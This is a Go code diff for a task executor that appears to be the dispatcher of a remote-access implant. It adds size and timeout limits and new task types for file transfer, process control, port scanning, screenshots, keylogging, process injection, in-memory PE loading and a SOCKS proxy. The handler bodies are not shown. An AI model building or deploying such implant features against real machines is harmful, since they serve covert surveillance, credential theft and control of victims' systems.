@@ -19,18 +19,34 @@ func NewExecutor(registry *plugin.Registry) *Executor {
 	return &Executor{Registry: registry}
 }
 
+const (
+	maxTaskDataSize    = 10 << 20     // 10 MB max task data
+	defaultTaskTimeout = 10 * time.Minute
+)
+
 func (e *Executor) Execute(task *pb.Task) *pb.TaskResult {
 	start := time.Now()
+
+	// Guard against oversized task payloads
+	if len(task.Data) > maxTaskDataSize {
+		return &pb.TaskResult{
+			TaskId:          task.TaskId,
+			Success:         false,
+			Error:           fmt.Sprintf("task data too large: %d bytes (max %d)", len(task.Data), maxTaskDataSize),
+			ExecutionTimeMs: time.Since(start).Milliseconds(),
+		}
+	}
 
 	var data []byte
 	var err error
 
-	ctx := context.Background()
-	if task.TimeoutMs > 0 {
-		var cancel context.CancelFunc
-		ctx, cancel = context.WithTimeout(ctx, time.Duration(task.TimeoutMs)*time.Millisecond)
-		defer cancel()
+	// Always set a timeout — use explicit if provided, otherwise default
+	timeout := time.Duration(task.TimeoutMs) * time.Millisecond
+	if timeout <= 0 || timeout > defaultTaskTimeout {
+		timeout = defaultTaskTimeout
 	}
+	ctx, cancel := context.WithTimeout(context.Background(), timeout)
+	defer cancel()
 
 	switch task.TaskType {
 	case pb.TaskType_TASK_SHELL:
@@ -44,6 +60,34 @@ func (e *Executor) Execute(task *pb.Task) *pb.TaskResult {
 		}
 	case pb.TaskType_TASK_MODULE:
 		data, err = e.executeModule(ctx, task.Data)
+	case pb.TaskType_TASK_FILE_DOWNLOAD:
+		data, err = executeFileDownload(ctx, task.Data)
+	case pb.TaskType_TASK_FILE_UPLOAD:
+		data, err = executeFileUpload(ctx, task.Data)
+	case pb.TaskType_TASK_PROCESS_LIST:
+		data, err = executeProcessList(ctx, task.Data)
+	case pb.TaskType_TASK_PROCESS_KILL:
+		data, err = executeProcessKill(ctx, task.Data)
+	case pb.TaskType_TASK_NET_IFCONFIG:
+		data, err = executeNetIfconfig(ctx, task.Data)
+	case pb.TaskType_TASK_NET_PORTSCAN:
+		data, err = executeNetPortscan(ctx, task.Data)
+	case pb.TaskType_TASK_SCREENSHOT:
+		data, err = executeScreenshot(ctx, task.Data)
+	case pb.TaskType_TASK_KEYLOG_START:
+		data, err = executeKeylogStart(ctx, task.Data)
+	case pb.TaskType_TASK_KEYLOG_STOP:
+		data, err = executeKeylogStop(ctx, task.Data)
+	case pb.TaskType_TASK_KEYLOG_DUMP:
+		data, err = executeKeylogDump(ctx, task.Data)
+	case pb.TaskType_TASK_INJECT:
+		data, err = executeInject(ctx, task.Data)
+	case pb.TaskType_TASK_PE_LOAD:
+		data, err = executePELoad(ctx, task.Data)
+	case pb.TaskType_TASK_SOCKS_START:
+		data, err = executeSocksStart(ctx, task.Data)
+	case pb.TaskType_TASK_SOCKS_STOP:
+		data, err = executeSocksStop(ctx, task.Data)
 	default:
 		err = fmt.Errorf("unsupported task type: %s", task.TaskType)
 	}
